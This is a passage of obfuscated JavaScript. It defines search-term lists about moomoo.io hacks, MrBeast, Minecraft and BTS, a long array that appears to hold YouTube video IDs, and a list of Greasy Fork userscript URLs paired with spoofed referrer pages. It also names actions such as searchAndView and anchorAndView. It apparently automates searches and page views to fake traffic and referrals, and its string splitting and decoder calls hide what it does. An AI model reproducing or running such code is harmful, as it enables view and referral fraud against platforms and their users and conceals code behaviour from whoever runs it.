searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + T(0x16) + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x2f9 * 0x1 + -0x9ee + -0x1 * -0xcf1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xdcb + -0x76a + -0x657)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x5 * -0x4e9 + 0x1c74 + 0x13 * -0x2ca);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    U(0x8) + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    V(0x1d, '%f1j') + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    V(0x7, 'R7gS') + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    T(0xc) + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    U(0x14) + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    U(0x1b) + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    T(0xd) + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    T(0x15) + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + U(0x1a) + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + V(0x3, 'I%NK') + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
